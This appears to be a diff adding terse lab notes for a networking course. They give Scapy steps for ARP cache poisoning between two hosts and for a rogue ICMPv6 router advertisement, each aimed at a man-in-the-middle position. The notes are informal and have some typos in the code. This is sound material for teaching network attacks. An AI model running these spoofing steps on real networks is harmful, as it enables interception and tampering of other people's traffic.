@@ -1,0 +1,33 @@
+Networking 1 - Task 1: ARP MitM 
+SCAPY:
+  a=ETHR()
+    a.type=0x0806
+  b=ARP()
+    change op (op code) to 2 = is-at; 1 = who-has
+    b.pdst="tgt ip" .126
+    b.psrc="spoofed ip" .115
+  c=ARP()
+    c.op=2
+    c.pdst="tgt ip" .115
+    c.psrc="spoofed ip" .126
+    
+sendp (a/c, iface="eth0")    
+sendp ( a/b, iface="eth0")
+    ### trace through wireshark
+    ### or: sudo tcpdump -vv icmp -X
+    
+    
+    
+Networking 1 - Task 2: ICMPv6 MitM , IPv6
+  a=IPv6()
+    a.dst="ff02::1" ### all nodes or ::1
+  b=ICMPv6ND_RA()
+  c=ICMPv6NDOptSrcLLAddr()
+    c.lladdr="own mac"
+  d=ICMPv6NDOptMTU()
+  e=ICMPv6NDOptPrefixInfo()
+    e.prefix="fd00:deaf:cafe::"
+    
+  send (a/b/c/d/e, iface="eth0")
+    
+    
